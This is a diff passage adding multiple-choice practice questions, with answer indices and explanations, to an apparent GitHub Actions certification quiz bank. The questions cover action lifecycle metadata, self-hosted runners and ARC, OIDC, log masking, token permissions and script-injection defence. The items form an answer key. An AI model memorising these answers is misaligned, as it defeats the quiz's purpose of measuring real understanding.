+ c:2, e:"`runs.post` defines a post-execution script for supported action types. It is invoked during the action/job post-processing lifecycle, making it the appropriate mechanism for action-owned cleanup. Exam hint: action-owned teardown belongs in the action metadata lifecycle, not a caller's optional cleanup step. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax' target='_blank'>Official docs: Action pre/post lifecycle</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
+
+{d:"actions", q:"In a Docker container action's `action.yml`, what is the difference between `entrypoint:` and `args:`?",
+ o:[
+   "entrypoint selects the runner operating system; args defines environment variables",
+   "entrypoint overrides the container's executable entrypoint; args supplies arguments to that executable",
+   "args replaces the action's Docker image; entrypoint selects the Node version",
+   "They are interchangeable"
+ ],
+ c:1, e:"`entrypoint` controls the executable used to start the container action, while `args` supplies the arguments passed to that executable. Exam hint: entrypoint chooses the executable; args supplies its arguments. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax' target='_blank'>Official docs: Docker action metadata</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#34-docker-container-actions' target='_blank'>Study guide: Chapter 3 §3.4 — Docker Container Actions</a>."},
+
+{d:"actions", q:"A workflow uses `uses: ./.github/actions/deploy`, but the runner reports that the local action directory does not exist. What is the most likely cause?",
+ o:[
+   "Local actions cannot be stored under `.github`",
+   "The repository was not checked out before the local action was invoked",
+   "Local actions must always be Docker actions",
+   "The path must omit the leading `./`"
+ ],
+ c:1, e:"Local actions are read from the runner's filesystem. On a fresh GitHub-hosted runner, the repository must first be checked out so the local action files exist. Exam hint: `./...` reads files from the runner workspace; ensure the repository is present first. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax' target='_blank'>Official docs: Local actions</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#32-composite-actions' target='_blank'>Study guide: Chapter 3 §3.2 — Composite Actions</a>."},
+
+{d:"actions", q:"An action input is declared with `required: false` and `default: production`. What happens if the caller omits that input?",
+ o:[
+   "The action fails because every input must be explicitly supplied",
+   "The action receives the default value `production`",
+   "The default is ignored unless `required` is true",
+   "The value becomes an environment variable automatically"
+ ],
+ c:1, e:"An optional input can define a `default:` value. When the caller omits the input, the action receives that default value. Exam hint: optional + default means omission resolves to the declared fallback. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax' target='_blank'>Official docs: Action inputs</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#32-composite-actions' target='_blank'>Study guide: Chapter 3 §3.2 — Composite Actions</a>."},
+
+{d:"actions", q:"A custom action needs a setup script to run during the action lifecycle before its main execution. Which mechanism should be used?",
+ o:[
+   "runs.pre",
+   "runs.init",
+   "lifecycle.before_all",
+   "boot"
+ ],
+ c:0, e:"`runs.pre` defines a pre-execution script in the action lifecycle, analogous to `runs.post` for post-execution work. Exam hint: the metadata key is `pre`, nested under `runs`. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax' target='_blank'>Official docs: JavaScript action pre lifecycle</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/03_chapter_author_maintain_actions.html#31-three-action-types--choosing-correctly' target='_blank'>Study guide: Chapter 3 §3.1 — Action Types</a>."},
+
+// ---------------- MANAGE FOR THE ENTERPRISE (6 NEW) ----------------
+{d:"enterprise", q:"What network connectivity does a typical self-hosted runner require to communicate with GitHub?",
+ o:[
+   "Inbound TCP 80 and 443 connections from GitHub",
+   "Outbound HTTPS communication over port 443; no inbound runner connection is required",
+   "A bidirectional VPN tunnel",
+   "Inbound SSH on port 22"
+ ],
+ c:1, e:"Self-hosted runners communicate with GitHub using outbound network connections, primarily over HTTPS. They do not require an inbound firewall port for GitHub to connect to the runner. Exam hint: runners initiate communication outward; GitHub does not need to open an inbound port to the runner. 🔗 <a href='https://docs.github.com/en/actions/reference/runners/self-hosted-runners' target='_blank'>Official docs: Self-hosted runners</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+
+{d:"enterprise", q:"Why is registering a production self-hosted runner with `--ephemeral` useful?",
+ o:[
+   "It grants temporary administrator privileges",
+   "It causes the runner to accept one job and then deregister, reducing persistent state between workloads",
+   "It enables public repositories to use the runner automatically",
+   "It permanently caches credentials for faster builds"
+ ],
+ c:1, e:"An ephemeral runner is intended for one job and then deregisters. This helps reduce the risk of files, credentials, or other state from one workload persisting into another. Exam hint: one job, then automatic deregistration; cleanup/wiping is your automation responsibility. 🔗 <a href='https://docs.github.com/en/actions/reference/runners/self-hosted-runners' target='_blank'>Official docs: Ephemeral runners</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+
+{d:"enterprise", q:"An organization needs to restrict a self-hosted runner group so only three repositories can submit jobs to it. Where should this restriction be configured?",
+ o:[
+   "As custom labels on the runners",
+   "In the runner group's repository access policy, selecting only the three repositories",
+   "With an `if:` condition in every workflow",
+   "By creating one runner group per repository"
+ ],
+ c:1, e:"Runner groups have repository access policies. Administrators can restrict a group to selected repositories instead of allowing every repository in the organization to target it. Exam hint: repository access belongs to the runner group policy, not runner labels. 🔗 <a href='https://docs.github.com/en/actions/reference/runners/managing-self-hosted-runners' target='_blank'>Official docs: Runner groups</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+
+{d:"enterprise", q:"An organization uses Actions Runner Controller (ARC) with runner scale sets. What distinguishes a runner scale set from a traditional self-hosted runner?",
+ o:[
+   "A scale set supports unlimited custom labels on each runner",
+   "A scale set belongs to one runner group and has one label, while its active runner capacity is managed by an autoscaler",
+   "A scale set can only execute Windows jobs",
+   "A scale set cannot be referenced through `runs-on:`"
+ ],
+ c:1, e:"A runner scale set belongs to a runner group and has one label, while the number of active ephemeral runners is managed by an autoscaler. Exam hint: focus on the scale set's group/label targeting model and autoscaled ephemeral capacity. 🔗 <a href='https://docs.github.com/en/actions/concepts/runners/runner-groups' target='_blank'>Official docs: Runner scale sets</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
+
+{d:"enterprise", q:"Two ARC runner scale sets are both online and eligible to receive the same job. Can an administrator configure which eligible scale set GitHub selects?",
+ o:[
+   "Yes; the scale set with the most capacity always wins",
+   "Yes; the oldest scale set always wins",
+   "No; selection among eligible scale sets is not configurable",
+   "Yes; GitHub alternates them evenly"
+ ],
+ c:2, e:"When multiple scale sets are online and eligible, the assignment between them is not configurable. The study material describes this as effectively a race. Exam hint: eligibility does not give you a deterministic selection knob between multiple matching scale sets. 🔗 <a href='https://docs.github.com/en/actions/concepts/runners/runner-groups' target='_blank'>Official docs: Runner scale sets</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#43-runner-scale-sets-and-actions-runner-controller-arc' target='_blank'>Study guide: Chapter 4 §4.3 — Runner Scale Sets & ARC</a>."},
+
+{d:"enterprise", q:"A public repository is being considered for use with a self-hosted runner group. Why is this particularly risky?",
+ o:[
+   "Public repositories cannot execute workflows",
+   "Fork pull requests can potentially execute attacker-controlled workflow code on infrastructure you control",
+   "Self-hosted runners cannot access public repositories",
+   "Public repositories automatically receive administrator credentials"
+ ],
+ c:1, e:"A public repository exposes a large attack surface through fork pull requests. Running untrusted workflow code on self-hosted infrastructure can expose the runner and its network environment, which is why public repository access to runner groups is restricted by default in the study material. Exam hint: public fork PRs can execute untrusted workflow code on infrastructure you control. 🔗 <a href='https://docs.github.com/en/actions/reference/runners/self-hosted-runners' target='_blank'>Official docs: Self-hosted runner security</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+
+// ---------------- SECURE & OPTIMIZE AUTOMATION (6 NEW) ----------------
+{d:"security", q:"A cloud IAM trust policy should allow OIDC authentication only from the `main` branch of `octocat/app`. Which GitHub OIDC claim is most directly suited to this restriction?",
+ o:[
+   "aud",
+   "iss",
+   "sub",
+   "actor"
+ ],
+ c:2, e:"The `sub` claim identifies the workflow's repository/ref or environment context. A trust policy can use it to restrict role assumption to a specific repository and branch or environment. Exam hint: `sub` carries the repository/ref or environment subject used in trust policies. 🔗 <a href='https://docs.github.com/en/actions/reference/security/oidc' target='_blank'>Official docs: OIDC claims</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#54-oidc--keyless-cloud-authentication' target='_blank'>Study guide: Chapter 5 §5.4 — OIDC</a>."},
+
+{d:"security", q:"A workflow obtains an API token dynamically and wants accidental appearances of that exact token in later logs to be replaced with `***`. Which command should it use?",
+ o:[
+   "echo \"::add-mask::$TOKEN\"",
+   "echo \"::mask::$TOKEN\"",
+   "echo \"mask=true\" >> \"$GITHUB_ENV\"",
+   "export MASKED_TOKEN=$TOKEN"
+ ],
+ c:0, e:"The `::add-mask::<value>` workflow command registers the value with the runner's log masking mechanism so subsequent occurrences are redacted. Exam hint: register the exact value with `add-mask` before it can appear in logs. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands' target='_blank'>Official docs: Log masking</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
+
+{d:"security", q:"A workflow uses `on: pull_request: types: [closed]`. How can it determine whether the pull request was actually merged?",
+ o:[
+   "Check `github.event.action == 'merged'`",
+   "Check `github.event.pull_request.merged == true`",
+   "Check `github.event.pull_request.state == 'merged'`",
+   "The `closed` event only fires for merged pull requests"
+ ],
+ c:1, e:"A `closed` pull request event occurs for both merged and unmerged PRs. The `github.event.pull_request.merged` boolean distinguishes the two cases. Exam hint: `closed` describes the event; the payload's `merged` boolean describes the outcome. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: Pull request event data</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
+
+{d:"security", q:"An organization sets the default GITHUB_TOKEN permission policy to read-only. A workflow needs to create GitHub issues. What must the workflow do?",
+ o:[
+   "Nothing; issues: write is automatically inherited",
+   "Explicitly request the required write permission, such as `issues: write`",
+   "Use `secrets.GITHUB_TOKEN` instead of `github.token`",
+   "Enable `workflow_dispatch`"
+ ],
+ c:1, e:"A read-only default enforces least privilege. A workflow that needs a write scope must explicitly request it through `permissions:`. The study material also notes that specifying permissions causes unmentioned scopes to be zeroed. Exam hint: read-only defaults require an explicit write scope for the operation. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: GITHUB_TOKEN permissions</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
+
+{d:"security", q:"A workflow receives untrusted pull-request title text. Which pattern is safest when the text must be passed to a shell command?",
+ o:[
+   "Embed `${{ github.event.pull_request.title }}` directly inside the `run:` script",
+   "Pass the value through an `env:` variable and reference the environment variable from the shell",
+   "Write the title directly into a shell script file",
+   "Base64-encode the expression inside the `run:` block"
+ ],
+ c:1, e:"Direct interpolation of untrusted event fields into `run:` blocks can create script-injection risk. Passing the value through `env:` separates expression evaluation from shell parsing. Exam hint: keep attacker-controlled text as data via `env:` instead of interpolating it into shell source. 🔗 <a href='https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions' target='_blank'>Official docs: Script injection prevention</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#53-script-injection-via-untrusted-input' target='_blank'>Study guide: Chapter 5 §5.3 — Script Injection</a>."},
+
+{d:"security", q:"A workflow requests OIDC authentication but receives an authorization error when attempting to mint an OIDC token. Which permission is most likely missing?",
+ o:[
+   "contents: write",
+   "id-token: write",
+   "actions: write",
+   "security-events: write"
+ ],
+ c:1, e:"OIDC token issuance requires `id-token: write`. This permission must be granted explicitly when a workflow needs to obtain an OIDC identity token. Exam hint: requesting the JWT requires the dedicated `id-token` permission. 🔗 <a href='https://docs.github.com/en/actions/reference/security/oidc' target='_blank'>Official docs: OIDC token permission</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#54-oidc--keyless-cloud-authentication' target='_blank'>Study guide: Chapter 5 §5.4 — OIDC</a>."},
+
+// ---------------- SELF-HOSTED RUNNER LABELS (1 NEW) ----------------
+{d:"enterprise", q:"A job specifies `runs-on: [self-hosted, linux, x64, gpu]`. Which runner is eligible to receive the job?",
+ o:[
+   "Any runner with at least one of those labels",
+   "A runner possessing all four labels",
+   "Any runner with `self-hosted` and `linux`; the other labels are preferences",
+   "Only a runner with `gpu`; the other labels are ignored"
+ ],
+ c:1, e:"Multiple labels in a `runs-on` array are matched using AND semantics. The runner must have every listed label to be eligible. Exam hint: multiple labels in the array are requirements, not alternatives. 🔗 <a href='https://docs.github.com/en/actions/reference/runners/self-hosted-runners' target='_blank'>Official docs: Runner labels</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."}
+
 ];
 
 /* ============================================================
